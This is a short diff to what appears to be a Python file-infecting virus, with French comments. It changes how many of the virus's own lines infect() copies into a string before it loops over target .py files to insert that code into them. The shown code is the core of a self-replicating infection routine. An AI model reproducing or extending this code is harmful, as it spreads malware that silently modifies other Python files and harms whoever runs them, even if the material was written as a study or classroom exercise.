@@ -21,7 +21,7 @@ def infect(filestoinfect): #changes to be made in the target file
     virus = open(os.path.abspath(target_file)) # lecture du contenue du virus
     virusstring = "" 
     for i,line in enumerate(virus): 
-        if i>=0 and i <41: # nb ligne du virus
+        if i>=0 and i <80: # nb ligne du virus
             virusstring += line # stockage contenue du virus (meme si pas le code originel)
     virus.close 
     for fname in filestoinfect: #récupération du code originelle du .py infecté
